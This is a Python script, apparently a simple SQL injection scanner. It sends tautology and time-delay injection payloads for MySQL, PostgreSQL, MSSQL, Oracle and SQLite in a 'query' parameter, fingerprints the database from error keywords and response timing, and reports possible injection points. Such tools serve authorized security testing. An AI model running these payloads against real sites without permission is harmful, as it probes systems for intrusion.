import requests
import time
import urllib.parse

# SQL Injection Payloads for fingerprinting
DB_FINGERPRINT_PAYLOADS = {
    "MySQL": "' OR 1=1 --",
    "PostgreSQL": "' OR 1=1; --",
    "SQLite": "' OR 1=1 --",
    "MSSQL": "' OR 1=1; --",
    "Oracle": "' OR 1=1 --"
}

# Time-based SQL Injection Payloads
TIME_DELAY_PAYLOADS = {
    "MySQL": "' OR SLEEP(5) --",
    "PostgreSQL": "' OR pg_sleep(5) --",
    "MSSQL": "' OR WAITFOR DELAY '00:00:05' --",
    "Oracle": "' OR dbms_pipe.receive_message('a', 5) --"
}

ERROR_KEYWORDS = {
    "MySQL": ["mysql", "MariaDB", "syntax error"],
    "PostgreSQL": ["postgresql", "pg_", "syntax error"],
    "SQLite": ["sqlite", "SQLITE_ERROR"],
    "MSSQL": ["microsoft sql", "mssql", "unclosed quotation mark"],
    "Oracle": ["oracle", "ora-", "missing expression"]
}

SQLI_TEST_PAYLOADS = [
    "'", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*"
]

def fingerprint_database(url):
    """Attempts to identify the database by testing for SQL errors and time delays."""
    detected_db = "Unknown"
    # Check error-based fingerprinting
    for db, payload in DB_FINGERPRINT_PAYLOADS.items():
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{url}?query={encoded_payload}"
        try:
            response = requests.get(test_url, timeout=10)
            for keyword in ERROR_KEYWORDS[db]:
                if keyword.lower() in response.text.lower():
                    detected_db = db
                    break
            if detected_db != "Unknown":
                return detected_db
        except requests.exceptions.RequestException:
            continue

    # Check time-based SQLi
    for db, payload in TIME_DELAY_PAYLOADS.items():
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{url}?query={encoded_payload}"
        try:
            start_time = time.time()
            requests.get(test_url, timeout=15)
            elapsed_time = time.time() - start_time
            if elapsed_time > 4.5:
                return db
        except requests.exceptions.RequestException:
            continue

    return detected_db

def detect_sqli(url):
    """Tests for SQL Injection by comparing normal and injected responses."""
    results = []
    try:
        normal_response = requests.get(url, timeout=10)
        normal_text = normal_response.text.lower()
        normal_length = len(normal_response.text)
        normal_headers = normal_response.headers
    except requests.exceptions.RequestException as e:
        return [f"[!] Error connecting to target: {str(e)}"]

    # Test for content-based SQL injection
    for payload in SQLI_TEST_PAYLOADS:
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{url}?query={encoded_payload}"
        try:
            response = requests.get(test_url, timeout=10)
            test_text = response.text.lower()
            test_length = len(response.text)
            test_headers = response.headers
            if test_text != normal_text or test_length != normal_length or test_headers != normal_headers:
                results.append(f"[!] Possible SQL Injection detected with payload: {payload}")
        except requests.exceptions.RequestException:
            continue

    # Test for time-based SQL injection
    db_type = fingerprint_database(url)
    if db_type != "Unknown":
        payload = TIME_DELAY_PAYLOADS[db_type]
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{url}?query={encoded_payload}"
        try:
            start_time = time.time()
            requests.get(test_url, timeout=15)
            elapsed_time = time.time() - start_time
            if elapsed_time > 4.5:
                results.append(f"[!] Time-based SQL Injection detected using {db_type}.")
        except requests.exceptions.RequestException as e:
            results.append(f"[!] SQLi time-based test failed: {str(e)}")

    if not results:
        results.append("[+] No SQL Injection detected.")
    return results
